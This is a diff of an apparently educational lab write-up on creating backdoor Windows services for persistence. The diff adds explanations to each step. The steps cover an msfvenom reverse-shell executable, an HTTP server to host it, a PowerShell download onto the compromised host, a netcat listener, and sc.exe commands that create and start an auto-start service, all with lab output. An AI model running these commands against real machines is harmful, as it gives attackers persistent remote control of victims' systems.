@@ -7,8 +7,7 @@ This writeup was last updated: 07/05/2023
 
 # Creating Backdoor Services
 1. Started this room's machine
-2. `PowerShell` from the compromised Windows machine to open up PowerShell
-3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o <PAYLOAD NAME1>.exe`
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o <PAYLOAD NAME1>.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -19,17 +18,25 @@ Final size of exe-service file: 48640 bytes
 Saved as: rev-svc.exe
 
 ```
-4. `sudo python3 -m http.server`
+3. `sudo python3 -m http.server` from our Linux attack machine to start and transform our attack machine into a simple HTTP server that we'll connect to from our compromised machine to downlaod our payload
 ```bash
 root@ip-10-10-44-151:~# sudo python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.254.131 - - [06/Jul/2023 01:44:11] "GET /rev-svc.exe HTTP/1.1" 200 -
 ```
-5. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','<PAYLOAD NAME2>.exe')"`
+4. `PowerShell` from the compromised Windows machine to open up PowerShell
+```PowerShell
+C:\Users\Administrator>PowerShell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
+```
+5. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<MACHINE IP>:8000/<PAYLOAD NAME1>.exe','<PAYLOAD NAME2>.exe')"` from our compromised Windows machine to create a new instance of the **System.Net.Web** class, which allowed us to call its **DownloadFile** method, which then allowed us to download our payload from our attack machine which we temporarily turned into an HTTP server by specifying its location and the name we want to give that payload when we download it onto the compromised machine
 ```PowerShell
 PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
-```
-6. `dir`
+``` 
+6. `dir` from our compromised Windows machine to display the files and directories that are in our current working directory onto our terminal to verify that we successfully downlaoded our payload from our attack machine, which we did
 ```PowerShell
 PS C:\Users\Administrator> dir
 
@@ -53,16 +60,16 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/6/2023  12:44 AM          48640 Payload.exe
 ```
-7. `nc -lvnp <PORT NUMBER>`
+7. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connection
 ```Bash
 root@ip-10-10-44-151:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
-8. `sc.exe create <SERVICE NAME> binPath= "<PAYLOAD NAME2 PATH>" start= auto`
+8. `sc.exe create <SERVICE NAME> binPath= "<PAYLOAD NAME2 PATH>" start= auto` from our compromised Windows machine to create a new service that'll be automatically started when our compromised machine boots up, which will then execute the program located in its binary path, which contains our payload
 ```PowerShell
 PS C:\Users\Administrator> sc.exe create THMservice binPath= "C:\Users\Administrator\Payload.exe" start= auto
 ```
-9. `sc.exe start <SERVICE NAME>`
+9. `sc.exe start <SERVICE NAME>` from our compromised Windows machine to start the new service that we just created, which executed our payload that resulted in a reverse shell being created which then connected back to our netcat listener that's running on our attack machine
 ```PowerShell
 PS C:\Users\Administrator> sc.exe start THMservice
 
